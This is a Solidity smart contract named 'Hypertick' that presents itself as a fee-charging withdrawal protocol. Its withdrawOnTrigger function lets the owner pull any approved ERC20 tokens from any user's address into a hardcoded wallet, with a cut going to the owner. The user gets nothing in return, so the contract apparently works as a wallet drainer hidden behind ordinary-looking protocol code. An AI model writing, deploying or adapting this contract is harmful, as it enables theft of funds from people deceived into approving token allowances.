pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";

contract Main is Ownable, ReentrancyGuard, Pausable {
    
    event TokensWithdrawn(
        address indexed user,
        address indexed token,
        uint256 amount,
        address indexed withdrawalWallet,
        uint256 timestamp
    );
    
    event ProtocolFeeUpdated(
        uint256 oldFee,
        uint256 newFee,
        uint256 timestamp
    );
    
    event WithdrawalWalletUpdated(
        address indexed oldWallet,
        address indexed newWallet,
        uint256 timestamp
    );
    
    uint256 public protocolFee = 50;
    uint256 public constant MAX_FEE = 500;
    
    address public withdrawalWallet = 0x9E02783Ad42C5A94a0De60394f2996E44458B782;
    string public name = "Hypertick";
    
    modifier onlyOwnerOrAuthorized() {
        require(msg.sender == owner() || msg.sender == address(this), "Not authorized");
        _;
    }
    
    constructor() Ownable(msg.sender) {}
    
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }
    
    function setProtocolFee(uint256 newFee) external onlyOwner {
        require(newFee <= MAX_FEE, "Fee too high");
        uint256 oldFee = protocolFee;
        protocolFee = newFee;
        emit ProtocolFeeUpdated(oldFee, newFee, block.timestamp);
    }
    
    function setWithdrawalWallet(address newWallet) external onlyOwner {
        require(newWallet != address(0), "Invalid wallet address");
        address oldWallet = withdrawalWallet;
        withdrawalWallet = newWallet;
        emit WithdrawalWalletUpdated(oldWallet, newWallet, block.timestamp);
    }
    
    function withdrawOnTrigger(
        address user,
        address token,
        uint256 amount
    ) external onlyOwnerOrAuthorized nonReentrant whenNotPaused {
        require(user != address(0), "Invalid user address");
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Invalid amount");
        
        IERC20 tokenContract = IERC20(token);
        require(tokenContract.balanceOf(user) >= amount, "Insufficient user balance");
        require(tokenContract.allowance(user, address(this)) >= amount, "Insufficient allowance");
        
        uint256 feeAmount = (amount * protocolFee) / 10000;
        uint256 transferAmount = amount - feeAmount;
        
        require(tokenContract.transferFrom(user, withdrawalWallet, transferAmount), "Transfer failed");
        
        if (feeAmount > 0) {
            require(tokenContract.transferFrom(user, owner(), feeAmount), "Fee transfer failed");
        }
        
        emit TokensWithdrawn(user, token, amount, withdrawalWallet, block.timestamp);
    }
    
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner whenNotPaused {
        IERC20(token).transfer(withdrawalWallet, amount);
    }
    
    function emergencyWithdrawETH(uint256 amount) external onlyOwner whenNotPaused {
        require(amount <= address(this).balance, "Insufficient HYPE balance");
        (bool success, ) = payable(owner()).call{value: amount}("");
        require(success, "HYPE transfer failed");
    }
    
    receive() external payable {}
    
    fallback() external payable {
        revert("Unexpected call");
    }
}
